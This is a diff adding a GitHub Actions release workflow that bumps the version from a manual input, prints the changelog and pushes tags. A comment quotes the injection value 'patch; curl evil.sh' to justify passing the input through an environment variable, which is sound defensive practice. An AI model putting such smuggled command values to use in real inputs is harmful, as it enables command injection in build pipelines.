@@ -1,0 +1,45 @@
+name: Create Release
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Semantic version (major | minor | patch | premajor | preminor | prepatch | prerelease)'
+        default: 'patch'
+        required: true
+
+jobs:
+  version:
+    name: Create version
+    runs-on: ubuntu-latest
+    permissions:
+        contents: write
+    steps:
+    - uses: actions/checkout@v5
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
+    - uses: pnpm/action-setup@v6
+    - uses: actions/setup-node@v5
+      with:
+        node-version: 24
+        cache: 'pnpm'
+    - name: Install dependencies
+      run: pnpm install --frozen-lockfile
+    - name: Configure git
+      run: |
+        git config user.name "github-actions[bot]"
+        git config user.email "github-actions[bot]@users.noreply.github.com"
+    - name: Create release
+      env:
+        # Pass the dispatch input through the environment instead of inline
+        # interpolation: a value like `patch; curl evil.sh` must never become
+        # part of the shell command line.
+        RELEASE_VERSION: ${{ github.event.inputs.version }}
+      run: pnpm release "$RELEASE_VERSION"
+    - name: Print details
+      run: |
+        cat package.json
+        cat CHANGELOG.md
+        git tag
+    - name: Push git version
+      run: git push --follow-tags origin main
